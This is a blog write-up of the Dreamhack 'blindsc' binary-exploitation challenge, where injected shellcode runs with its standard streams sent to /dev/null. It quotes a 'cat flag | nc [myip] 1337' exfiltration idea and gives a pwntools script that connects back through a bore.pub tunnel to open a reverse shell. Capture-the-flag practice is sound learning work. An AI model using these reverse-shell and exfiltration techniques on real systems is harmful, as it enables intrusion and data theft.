+++
date = '2026-05-09'
draft = false
title = 'Dreamhack blindsc Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
주어진 바이너리를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag 파일에 있습니다.

플래그의 형식은 DH{...} 입니다.


## Identifying the vulnerabilities

Ahh.. `blindsc` as in blind shellcode!

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbx
  __int64 v4; // rbx
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  __int64 v9; // rbx
  __int64 v10; // rbx
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbx
  __int64 v14; // rbx
  __int64 v15; // rbx
  __int64 v16; // rbx
  __int64 v17; // rbx
  __int64 v18; // rbx
  int fd; // [rsp+24h] [rbp-1Ch]
  void (*v21)(void); // [rsp+28h] [rbp-18h]

  setup();
  printf("Input shellcode: ");
  read(0, &buf, 0x100u);
  v21 = (void (*)(void))mmap(0, 0x1000u, 7, 34, -1, 0);
  v3 = qword_4068;
  *(_QWORD *)v21 = buf;
  [...]
  v17 = qword_4148;
  *((_QWORD *)v21 + 28) = qword_4140;
  *((_QWORD *)v21 + 29) = v17;
  v18 = qword_4158;
  *((_QWORD *)v21 + 30) = qword_4150;
  *((_QWORD *)v21 + 31) = v18;
  puts("\nNot gonna show you the result!");
  fd = open("/dev/null", 2);
  dup2(fd, 0);
  dup2(fd, 1);
  dup2(fd, 2);
  v21();
  return 0;
}
```

What I didn't recognize here was this `dup2` function. From the [geeks4geeks](https://www.geeksforgeeks.org/c/dup-dup2-linux-system-call/) page:

> The dup() system call creates a copy of a file descriptor. 
> 
> It uses the lowest-numbered unused descriptor for the new descriptor. 
>
> If the copy is successfully created, then the original and copy file descriptors may be used interchangeably. 
> 
>  The dup2() system call is similar to dup() but the basic difference between them is that instead of using the lowest-numbered unused file descriptor, it uses the descriptor number specified by the user. 

So before running our shellcode, this moves the `stdin`, `stdout` and `stderr` file descriptors to `/dev/null`. So this renders them unusable.

My first idea was to write the contents of flag into binary at offset `0x2020` (string) so its printed with `puts`, or somehow reopen stdin & stdout.

The second one was to create a reverse shell, but I didn't know how to achieve this.


```bash
0x555555557000     0x555555558000 r--p     1000    2000 blindsc
0x555555558000     0x555555559000 rw-p     1000    3000 blindsc
```

So our offset sadly only has read permissions. And we can't call `mprotect` and change it to `rw`, since PIE is enabled.

I started looking on the internet and found [this very inspiring](https://idiot.sg/blog/tokyowesterns-ctf-2018-load-pwn/):

> If we can find the appropriate gadgets, maybe we could run execve with syscalls and run a command like `cat flag | nc [myip] 1337` which would give us the flag. But I was unable to find any syscall gadgets, and this would be a very difficult operation to do with only syscalls

So, let's focus on creating a reverse shell! 

---

Luckily for us, `pwntools` has a built-in function in shellcraft for this. All we need to do is open a `tcp` tunnel on our machine, and connect them to it.

This made me write [this post](https://irinasusca.github.io/writeup-blog/tunneling) about tunneling for situations like this, so go ahead and look over that if you will.

I quickly spun up a `bore` tunnel, and a listener on port 1337. Now, let's finish the script and grab the flag!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
#elf = ELF("./blindsc")
#p = elf.process()
p = remote("host8.dreamhack.games", 17211)

context.arch = "amd64"
context.os = "linux"

shellcode = shellcraft.connect('bore.pub', 33843)
shellcode += shellcraft.findpeersh()

p.readuntil(b': ')
p.sendline(asm(shellcode))
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/blindsc.py)**.
